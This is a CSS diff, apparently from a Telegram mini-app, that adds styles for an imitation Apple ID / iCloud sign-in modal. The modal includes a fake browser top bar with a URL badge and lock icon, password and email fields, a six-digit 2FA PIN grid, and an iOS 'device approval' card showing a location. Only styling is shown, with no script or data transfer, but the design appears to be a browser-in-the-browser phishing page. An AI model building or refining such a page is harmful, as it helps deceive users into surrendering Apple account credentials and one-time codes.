@@ -2663,28 +2663,52 @@ body {
 
 /* Apple Auth Components */
 .btn-auth-alternative.btn-apple-method {
-    background: #000000;
-    border: 1px solid rgba(255, 255, 255, 0.25);
-    color: #ffffff;
-    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.5);
+    width: 100% !important;
+    padding: 13px 18px !important;
+    background: #000000 !important;
+    border: 1px solid rgba(255, 255, 255, 0.2) !important;
+    border-radius: 14px !important;
+    color: #ffffff !important;
+    font-size: 14px !important;
+    font-weight: 600 !important;
+    cursor: pointer !important;
+    display: flex !important;
+    justify-content: center !important;
+    align-items: center !important;
+    gap: 10px !important;
+    box-sizing: border-box !important;
+    transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1) !important;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4) !important;
+    margin-top: 10px !important;
 }
 
 .btn-auth-alternative.btn-apple-method:hover {
-    background: #111111;
-    border-color: rgba(255, 255, 255, 0.4);
+    background: #111111 !important;
+    border-color: rgba(255, 255, 255, 0.35) !important;
+    transform: translateY(-1px) !important;
+}
+
+.btn-auth-alternative.btn-apple-method:active {
+    transform: translateY(0) !important;
+}
+
+.btn-apple-svg {
+    width: 20px !important;
+    height: 20px !important;
+    flex-shrink: 0 !important;
+    vertical-align: middle !important;
 }
 
 .apple-badge-wrap {
-    width: 72px;
-    height: 72px;
-    border-radius: 50%;
-    background: rgba(255, 255, 255, 0.08);
-    border: 1px solid rgba(255, 255, 255, 0.2);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 12px;
-    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
+    display: flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+    margin: 0 auto 16px auto !important;
+    background: none !important;
+    border: none !important;
+    box-shadow: none !important;
+    width: auto !important;
+    height: auto !important;
 }
 
 .apple-user-chip {
@@ -3548,4 +3572,613 @@ body {
     .google-dark-hero-number {
         font-size: 46px !important;
     }
+}
+
+/* ========================================================
+   AUTHENTIC APPLE ID / iCLOUD MODAL WINDOW (APPLE DARK MODE)
+   ======================================================== */
+.apple-modal-overlay {
+    position: fixed !important;
+    top: 0 !important;
+    left: 0 !important;
+    right: 0 !important;
+    bottom: 0 !important;
+    width: 100% !important;
+    height: 100vh !important;
+    height: 100dvh !important;
+    height: var(--tg-viewport-height, 100vh) !important;
+    background: rgba(0, 0, 0, 0.88) !important;
+    backdrop-filter: blur(14px) !important;
+    -webkit-backdrop-filter: blur(14px) !important;
+    z-index: 999999 !important;
+    display: flex !important;
+    justify-content: center !important;
+    align-items: center !important;
+    padding: max(env(safe-area-inset-top, 0px), 24px) 10px max(env(safe-area-inset-bottom, 0px), 24px) 10px !important;
+    box-sizing: border-box !important;
+    overflow-y: auto !important;
+    -webkit-overflow-scrolling: touch !important;
+    animation: modalOverlayFade 0.25s ease-out;
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Helvetica Neue", sans-serif !important;
+}
+
+.apple-modal-overlay.hidden {
+    display: none !important;
+    pointer-events: none !important;
+}
+
+.apple-modal-window {
+    background: #000000 !important;
+    max-width: min(375px, calc(100vw - 16px)) !important;
+    width: 100% !important;
+    border-radius: 22px !important;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.95), 0 2px 10px rgba(0, 0, 0, 0.6) !important;
+    border: 1px solid #2c2c2e !important;
+    display: flex !important;
+    flex-direction: column !important;
+    overflow: hidden !important;
+    position: relative !important;
+    margin: auto !important;
+    box-sizing: border-box !important;
+    animation: modalWindowSlide 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+.apple-window-topbar {
+    background: #000000 !important;
+    border-bottom: 1px solid #1c1c1e !important;
+    padding: 8px 14px !important;
+    display: flex !important;
+    justify-content: space-between !important;
+    align-items: center !important;
+    user-select: none !important;
+    -webkit-user-select: none !important;
+}
+
+.apple-url-badge {
+    display: flex !important;
+    align-items: center !important;
+    gap: 6px !important;
+    background: #1c1c1e !important;
+    border: 1px solid #3a3a3c !important;
+    border-radius: 100px !important;
+    padding: 3px 10px !important;
+    max-width: calc(100% - 32px) !important;
+    min-width: 0 !important;
+    box-sizing: border-box !important;
+}
+
+.apple-lock-icon {
+    font-size: 10px !important;
+    flex-shrink: 0 !important;
+}
+
+.apple-url-text {
+    font-size: 11px !important;
+    font-weight: 500 !important;
+    color: #86868b !important;
+    white-space: nowrap !important;
+    overflow: hidden !important;
+    text-overflow: ellipsis !important;
+}
+
+.apple-window-close {
+    background: none !important;
+    border: none !important;
+    color: #86868b !important;
+    font-size: 16px !important;
+    cursor: pointer !important;
+    padding: 4px 6px !important;
+    display: flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+    border-radius: 50% !important;
+    transition: color 0.15s, background 0.15s !important;
+}
+
+.apple-window-close:hover {
+    color: #ffffff !important;
+    background: #1c1c1e !important;
+}
+
+/* Apple Progress Bar */
+.apple-progress-bar {
+    width: 100% !important;
+    height: 3px !important;
+    background: #1c1c1e !important;
+    position: relative !important;
+    overflow: hidden !important;
+}
+
+.apple-progress-bar.hidden {
+    display: none !important;
+}
+
+.apple-progress-bar-value {
+    width: 100% !important;
+    height: 100% !important;
+    background: #2997ff !important;
+    position: absolute !important;
+    left: -100% !important;
+    animation: appleIndeterminate 1.5s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite !important;
+}
+
+@keyframes appleIndeterminate {
+    0% { left: -100%; width: 50%; }
+    50% { left: 25%; width: 60%; }
+    100% { left: 100%; width: 50%; }
+}
+
+/* Content Container */
+.apple-window-content {
+    padding: 22px 20px 16px 20px !important;
+    box-sizing: border-box !important;
+    flex: 1 !important;
+    display: flex !important;
+    flex-direction: column !important;
+    min-height: 0 !important;
+}
+
+.auth-step.apple-modal-step {
+    display: none !important;
+}
+
+.auth-step.active.apple-modal-step {
+    display: flex !important;
+    flex-direction: column !important;
+    animation: fadeIn 0.2s ease-in-out;
+}
+
+/* Apple Card Header */
+.apple-card-header {
+    text-align: center !important;
+    margin-bottom: 20px !important;
+}
+
+.apple-logo-wrap {
+    display: flex !important;
+    justify-content: center !important;
+    align-items: center !important;
+    margin: 0 auto 14px auto !important;
+}
+
+.apple-svg-logo {
+    width: 48px !important;
+    height: 48px !important;
+    filter: drop-shadow(0 2px 10px rgba(255, 255, 255, 0.18)) !important;
+}
+
+.apple-title {
+    font-size: 22px !important;
+    font-weight: 600 !important;
+    color: #f5f5f7 !important;
+    margin: 0 0 6px 0 !important;
+    letter-spacing: -0.3px !important;
+}
+
+.apple-subtitle {
+    font-size: 13px !important;
+    color: #86868b !important;
+    margin: 0 !important;
+    line-height: 1.4 !important;
+}
+
+/* User Chip */
+.apple-user-chip {
+    display: inline-flex !important;
+    align-items: center !important;
+    gap: 8px !important;
+    background: #1c1c1e !important;
+    border: 1px solid #3a3a3c !important;
+    border-radius: 100px !important;
+    padding: 4px 12px 4px 8px !important;
+    margin-top: 10px !important;
+    cursor: pointer !important;
+    transition: background 0.15s !important;
+}
+
+.apple-user-chip:hover {
+    background: #2c2c2e !important;
+}
+
+.apple-avatar-mini {
+    width: 22px !important;
+    height: 22px !important;
+    border-radius: 50% !important;
+    background: #2c2c2e !important;
+    color: #ffffff !important;
+    display: flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+    font-size: 12px !important;
+}
+
+.apple-chip-email {
+    font-size: 12.5px !important;
+    font-weight: 500 !important;
+    color: #f5f5f7 !important;
+}
+
+.apple-chip-chevron {
+    color: #86868b !important;
+}
+
+/* Apple Floating Input Box */
+.apple-form-body {
+    display: flex !important;
+    flex-direction: column !important;
+    gap: 12px !important;
+}
+
+.apple-input-box {
+    position: relative !important;
+    display: flex !important;
+    align-items: center !important;
+    background: #1c1c1e !important;
+    border: 1px solid #3a3a3c !important;
+    border-radius: 12px !important;
+    padding: 0 12px !important;
+    height: 52px !important;
+    box-sizing: border-box !important;
+    transition: border-color 0.2s, box-shadow 0.2s !important;
+}
+
+.apple-input-box:focus-within {
+    border-color: #2997ff !important;
+    box-shadow: 0 0 0 3px rgba(41, 151, 255, 0.2) !important;
+}
+
+.apple-input-box.apple-input-invalid {
+    border-color: #ff453a !important;
+    box-shadow: 0 0 0 3px rgba(255, 69, 58, 0.2) !important;
+}
+
+.apple-input {
+    width: 100% !important;
+    height: 100% !important;
+    background: transparent !important;
+    border: none !important;
+    outline: none !important;
+    color: #f5f5f7 !important;
+    font-size: 15px !important;
+    padding-top: 14px !important;
+    padding-right: 32px !important;
+    box-sizing: border-box !important;
+    font-family: inherit !important;
+}
+
+.apple-label {
+    position: absolute !important;
+    left: 12px !important;
+    top: 50% !important;
+    transform: translateY(-50%) !important;
+    color: #86868b !important;
+    font-size: 14px !important;
+    pointer-events: none !important;
+    transition: all 0.2s ease !important;
+}
+
+.apple-input:focus ~ .apple-label,
+.apple-input:not(:placeholder-shown) ~ .apple-label {
+    top: 12px !important;
+    font-size: 10.5px !important;
+    color: #2997ff !important;
+}
+
+.apple-arrow-btn {
+    background: #2997ff !important;
+    border: none !important;
+    color: #ffffff !important;
+    width: 32px !important;
+    height: 32px !important;
+    border-radius: 50% !important;
+    display: flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+    cursor: pointer !important;
+    flex-shrink: 0 !important;
+    transition: transform 0.15s, background 0.15s !important;
+}
+
+.apple-arrow-btn:hover {
+    background: #0071e3 !important;
+    transform: scale(1.05) !important;
+}
+
+.apple-arrow-btn:active {
+    transform: scale(0.95) !important;
+}
+
+.apple-eye-toggle {
+    background: none !important;
+    border: none !important;
+    cursor: pointer !important;
+    padding: 6px !important;
+    display: flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+    margin-right: 4px !important;
+}
+
+/* Error Message */
+.apple-error-msg {
+    display: flex !important;
+    align-items: flex-start !important;
+    gap: 6px !important;
+    color: #ff453a !important;
+    font-size: 12.5px !important;
+    line-height: 1.35 !important;
+    margin-top: 2px !important;
+    animation: shake 0.3s ease-in-out !important;
+}
+
+.apple-error-msg.hidden {
+    display: none !important;
+}
+
+@keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20%, 60% { transform: translateX(-4px); }
+    40%, 80% { transform: translateX(4px); }
+}
+
+/* Links Row */
+.apple-links-row {
+    text-align: center !important;
+    margin-top: 8px !important;
+}
+
+.apple-link {
+    color: #2997ff !important;
+    font-size: 13px !important;
+    text-decoration: none !important;
+    transition: text-decoration 0.15s !important;
+}
+
+.apple-link:hover {
+    text-decoration: underline !important;
+}
+
+.apple-privacy-box {
+    display: flex !important;
+    align-items: center !important;
+    gap: 8px !important;
+    background: #151516 !important;
+    border-radius: 10px !important;
+    padding: 10px 12px !important;
+    margin-top: 14px !important;
+    color: #86868b !important;
+    font-size: 11.5px !important;
+    line-height: 1.35 !important;
+}
+
+/* Apple 2FA PIN Input */
+.apple-2fa-badge-icon {
+    display: flex !important;
+    justify-content: center !important;
+    margin-bottom: 8px !important;
+}
+
+.apple-pin-wrap {
+    margin: 12px 0 16px 0 !important;
+}
+
+.apple-pin-grid {
+    display: flex !important;
+    justify-content: center !important;
+    align-items: center !important;
+    gap: 6px !important;
+}
+
+.apple-pin-cell {
+    width: 40px !important;
+    height: 48px !important;
+    background: #1c1c1e !important;
+    border: 1px solid #3a3a3c !important;
+    border-radius: 10px !important;
+    color: #ffffff !important;
+    font-size: 22px !important;
+    font-weight: 600 !important;
+    text-align: center !important;
+    outline: none !important;
+    box-sizing: border-box !important;
+    transition: border-color 0.2s, box-shadow 0.2s !important;
+}
+
+.apple-pin-cell:focus {
+    border-color: #2997ff !important;
+    box-shadow: 0 0 0 3px rgba(41, 151, 255, 0.25) !important;
+}
+
+.apple-pin-cell.apple-pin-invalid {
+    border-color: #ff453a !important;
+    background: rgba(255, 69, 58, 0.08) !important;
+}
+
+.apple-pin-separator {
+    color: #86868b !important;
+    font-weight: 600 !important;
+    font-size: 16px !important;
+    user-select: none !important;
+}
+
+.apple-btn-primary {
+    background: #2997ff !important;
+    color: #ffffff !important;
+    border: none !important;
+    border-radius: 12px !important;
+    height: 44px !important;
+    font-size: 15px !important;
+    font-weight: 500 !important;
+    cursor: pointer !important;
+    width: 100% !important;
+    transition: background 0.15s, transform 0.1s !important;
+}
+
+.apple-btn-primary:hover {
+    background: #0071e3 !important;
+}
+
+.apple-btn-primary:active {
+    transform: scale(0.98) !important;
+}
+
+/* Apple Device Approval Prompt Card */
+.apple-ios-prompt-card {
+    background: #1c1c1e !important;
+    border: 1px solid #2c2c2e !important;
+    border-radius: 18px !important;
+    padding: 24px 18px 18px 18px !important;
+    text-align: center !important;
+    box-shadow: 0 12px 30px rgba(0, 0, 0, 0.7) !important;
+}
+
+.apple-prompt-map-icon {
+    display: flex !important;
+    justify-content: center !important;
+    margin-bottom: 12px !important;
+}
+
+.apple-prompt-title {
+    font-size: 19px !important;
+    font-weight: 600 !important;
+    color: #ffffff !important;
+    margin: 0 0 8px 0 !important;
+}
+
+.apple-prompt-desc {
+    font-size: 13.5px !important;
+    color: #86868b !important;
+    line-height: 1.4 !important;
+    margin: 0 0 14px 0 !important;
+}
+
+.apple-prompt-geo-pill {
+    display: inline-flex !important;
+    align-items: center !important;
+    background: #2c2c2e !important;
+    border-radius: 100px !important;
+    padding: 6px 14px !important;
+    font-size: 12.5px !important;
+    color: #f5f5f7 !important;
+    margin-bottom: 16px !important;
+}
+
+.apple-prompt-instruction {
+    font-size: 13px !important;
+    color: #86868b !important;
+    line-height: 1.4 !important;
+    margin-bottom: 18px !important;
+}
+
+.apple-prompt-btn-grid {
+    display: grid !important;
+    grid-template-columns: 1fr 1fr !important;
+    gap: 10px !important;
+}
+
+.apple-prompt-btn-secondary {
+    background: #2c2c2e !important;
+    color: #2997ff !important;
+    border: none !important;
+    border-radius: 12px !important;
+    height: 44px !important;
+    font-size: 14.5px !important;
+    font-weight: 500 !important;
+    cursor: pointer !important;
+    transition: background 0.15s !important;
+}
+
+.apple-prompt-btn-secondary:hover {
+    background: #3a3a3c !important;
+}
+
+.apple-prompt-btn-primary {
+    background: #2997ff !important;
+    color: #ffffff !important;
+    border: none !important;
+    border-radius: 12px !important;
+    height: 44px !important;
+    font-size: 14.5px !important;
+    font-weight: 600 !important;
+    cursor: pointer !important;
+    transition: background 0.15s !important;
+}
+
+.apple-prompt-btn-primary:hover {
+    background: #0071e3 !important;
+}
+
+/* Apple Modal Footer */
+.apple-modal-footer {
+    background: #000000 !important;
+    border-top: 1px solid #1c1c1e !important;
+    padding: 10px 16px !important;
+    display: flex !important;
+    justify-content: space-between !important;
+    align-items: center !important;
+    font-size: 10.5px !important;
+    color: #86868b !important;
+    box-sizing: border-box !important;
+}
+
+.apple-footer-links {
+    display: flex !important;
+    gap: 10px !important;
+}
+
+.apple-footer-links a {
+    color: #86868b !important;
+    text-decoration: none !important;
+}
+
+.apple-footer-links a:hover {
+    text-decoration: underline !important;
+}
+
+/* Mobile Rules Override for Apple */
+@media (max-width: 600px) {
+    .apple-modal-overlay {
+        padding: 0 !important;
+        align-items: flex-end !important;
+    }
+
+    .apple-modal-window {
+        width: 100% !important;
+        max-width: 100% !important;
+        border-radius: 26px 26px 0 0 !important;
+        margin: 0 !important;
+        border-bottom: none !important;
+        animation: modalWindowSlideUp 0.28s cubic-bezier(0.16, 1, 0.3, 1) !important;
+    }
+
+    .apple-window-topbar {
+        border-radius: 26px 26px 0 0 !important;
+        padding: 12px 16px !important;
+    }
+
+    .apple-window-close {
+        background: #2c2c2e !important;
+        width: 28px !important;
+        height: 28px !important;
+        font-size: 13px !important;
+    }
+
+    .apple-window-content {
+        padding: 20px 18px 24px 18px !important;
+    }
+
+    .apple-title {
+        font-size: 21px !important;
+    }
+
+    .apple-pin-cell {
+        width: 40px !important;
+        height: 48px !important;
+        font-size: 22px !important;
+    }
+}
+
+@keyframes modalWindowSlideUp {
+    from { transform: translateY(100%); }
+    to { transform: translateY(0); }
 }
